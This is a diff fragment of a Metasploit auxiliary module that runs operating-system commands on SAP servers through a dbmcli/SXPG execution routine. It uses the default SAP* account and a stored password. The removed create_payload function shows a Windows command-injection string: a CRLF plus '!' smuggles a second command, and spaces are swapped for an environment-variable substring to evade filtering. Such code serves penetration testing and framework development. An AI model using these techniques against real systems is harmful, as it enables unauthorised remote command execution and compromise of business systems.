@@ -35,7 +35,7 @@ class Metasploit4 < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'Username', 'SAP*']),
         OptString.new('PASSWORD', [true, 'Password', '06071992']),
         OptString.new('CMD', [true, 'Command', 'id']),
-        OptEnum.new('OS', [true, 'Target OS','UNIX',['UNIX', 'Windows NT']])
+        OptEnum.new('OS', [true, 'Target OS','Linux',['Linux', 'Windows']])
       ], self.class)
   end
 
@@ -54,27 +54,12 @@ class Metasploit4 < Msf::Auxiliary
         :pass => password
     }
 
-    res = dbmcli_sxpg_command_execute(datastore['OS'], datastore['CMD'], opts)
+    res = dbmcli_sxpg_execute(datastore['OS'], datastore['CMD'], opts)
 
     print res
   end
 
-  def create_payload(num)
-    command = ""
-    if datastore['OS'].downcase == "windows nt"
-      if num == 1
-        command = "-o c:\\#{@outfile} -n #{target_host}\r\n!"
-        space = "%programfiles:~10,1%"
-        command << datastore['COMMAND'].gsub(" ",space)
-        # TODO The command should be gsubbed for space?
-      else
-        command = "-ic c:\\#{@outfile}"
-      end
-    end
-
-    command
-  end
-
 end
+
 
 
